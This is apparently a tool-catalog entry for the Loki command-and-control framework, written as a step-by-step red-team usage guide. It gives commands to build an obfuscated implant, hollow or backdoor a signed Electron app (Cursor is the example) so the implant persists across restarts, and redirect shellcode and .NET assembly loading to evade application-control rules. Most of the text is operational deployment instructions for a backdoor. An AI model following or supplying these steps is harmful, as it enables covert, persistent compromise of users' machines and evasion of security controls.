---
name: "loki-c2"
categories:
  - backdoor
homepage: "https://github.com/boku7/Loki"
origin: "hacktricks"
recipe: "upstream"
build-system: "node"
meta-checked: "2026-11-13"
github-repo: "boku7/Loki"
github-stars: 1374
github-match: "exact"
gh-checked: "2026-11-13"
worth: 5.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-13"
license: "custom:BSL-1.1"
---

# loki-c2

> Stage-1 C2 framework that backdoors signed Electron apps via script-jacking, beaconing over an Azure Storage Blob channel.

## What it's for

Loki (boku7/Loki) is a Node.js command-and-control framework whose implant
runs inside a trusted, signed Electron application (MITRE ATT&CK
T1218.015): you replace the app's `resources/app/` JavaScript with an
obfuscated Loki agent, so the payload executes under the signed binary
without invalidating its code-signing signature — built for bypassing
application control (e.g. WDAC) and evading security software on red team
operations. The C2 channel is an Azure Storage Blob protected by a SAS
token, with AES-encrypted messages; there is no teamserver — the GUI
client and the agents both check in to the same datastore. It is not a
drop-in RAT for arbitrary hosts: it requires a vulnerable Electron app
that does not verify ASAR integrity (older versions are more likely
vulnerable), and the agent inherits the Electron/Chromium proxy stack.
Name trap: entirely unrelated to [[loki-scanner]] (Neo23x0's IOC
scanner) despite the shared name.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Generate an obfuscated agent payload

Stamp your C2 storage account into the agent and obfuscate it.

```
git clone https://github.com/boku7/Loki.git && cd Loki
npm install --save-dev javascript-obfuscator
node create_agent_payload.js
```

Outcome: the script prompts for the storage account URL and SAS token,
rewrites `config.js`, rehashes the bundled `assembly.node`/`keytar.node`
PE files, and writes the obfuscated payload to `./app/` — the directory
you will drop into a target Electron app.

### Hollow a vulnerable Electron app

Replace the app's own code so its signed executable launches Loki.

```
cd /path/to/ElectronApp/resources
rm -rf app
cp -r /path/to/Loki/app ./app
```

Outcome: launching the Electron executable now runs the Loki agent in
the background; the original app no longer functions (hollowed), and the
agent beacons to the configured Azure Storage Blob.

### Keep the real app working while Loki persists

Backdoor without hollowing, using the repo's `init.js` launcher.

```
rsync -a --exclude=package.json /path/to/Loki/app/ /path/to/Cursor/resources/app/
cp /path/to/Loki/loki/backdoor/init.js /path/to/Cursor/resources/app/
```

Then edit the app's `resources/app/package.json`: set
`"main": "init.js"`, delete `"type": "module"` and `"private": true`.

Outcome: clicking the app spawns Loki in a background process and then
starts the real application normally; when the user exits the app, the
`init.js` launcher re-arms itself so Loki keeps running and the app stays
backdoored across restarts.

### Operate a checked-in agent

Task the implant from the client's agent window (commands run in native
Node.js; `help` lists everything).

```
help set
set scexec_path C:/Users/user/AppData/ExcludedApp/scexec.node
```

Outcome: `help <command>` prints per-command usage for the ~20 agent
commands (`ls`, `cat`, `upload`, `download`, `scan`, `dns`, `scexec`,
`assembly`, `bof`, ...). The `set` example above re-points the
`scexec.node`/`assembly.node` load paths to an application-control
exclusion directory so shellcode and .NET assembly execution still work
under restrictive library-load rules.
